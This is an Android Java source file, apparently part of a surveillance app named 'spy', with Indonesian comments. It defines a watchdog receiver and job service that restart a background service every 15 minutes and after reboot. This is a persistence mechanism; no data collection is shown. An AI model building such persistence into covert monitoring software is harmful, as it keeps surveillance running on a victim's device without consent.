package ai.m4zk1play.spy;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

/** Penjaga: bangunkan service tiap 15 menit + setelah reboot. */
public class Watchdog extends BroadcastReceiver {

    public static final String ACTION_TICK = "ai.m4zk1play.spy.TICK";

    @Override
    public void onReceive(Context c, Intent i) {
        BootProvider.start(c);
        Persist.arm(c);
    }

    /** JobService terpisah supaya JobScheduler bisa dipakai. */
    public static class Job extends JobService {
        @Override
        public boolean onStartJob(JobParameters p) {
            BootProvider.start(this);
            return false;
        }

        @Override
        public boolean onStopJob(JobParameters p) { return true; }
    }
}
